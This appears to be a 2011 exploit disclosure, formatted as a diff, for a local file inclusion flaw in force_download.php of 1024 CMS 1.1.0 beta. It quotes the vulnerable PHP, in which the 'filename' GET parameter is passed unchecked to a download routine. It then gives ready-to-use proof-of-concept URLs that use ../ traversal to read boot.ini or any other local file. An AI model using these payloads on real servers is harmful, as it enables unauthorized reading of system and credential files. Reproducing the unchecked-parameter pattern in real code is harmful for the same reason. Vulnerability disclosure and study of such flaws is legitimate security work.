@@ -1,0 +1,26 @@
+ 
+# Exploit Title: [1024 CMS Version 1.1.0 beta(/complete-modules/modules/forcedownload/force_download.php) Local File Inclusion Vulnerability]
+# Date: [2011/10/19]
+# Author: [Sangyun YOO][I2SEC]
+# Email: yoosy0302 at naver dot com
+# Software Link: [http://1024cms.org/]
+# Version: [1024 CMS Version 1.1.0 beta]
+# Tested on: [Windows 7 Starter K]
+ 
+---------------------------------------
+ 
+source of force_download.php:
+1: <?php
+2 include(dirname(__FILE__)."/cls_forcedl.php");
+3: $filename = $_GET['filename']; <----------------- LFI
+4: $forcedl = new forcedownload();
+5: $forcedl->dlfile($filename);
+6: exit();
+6: ?>
+ 
+---------------------------------------
+ 
+proof of concept:
+http://[attacked_box]/[1024cms v1.1.0 beta]/complete-modules/modules/forcedownload/force_download.php?filename=../../../../../../../../boot.ini
+ 
+http://[attacked_box]/[1024cms v1.1.0 beta]/complete-modules/modules/forcedownload/force_download.php?filename=../../../../../../../../[localfile]
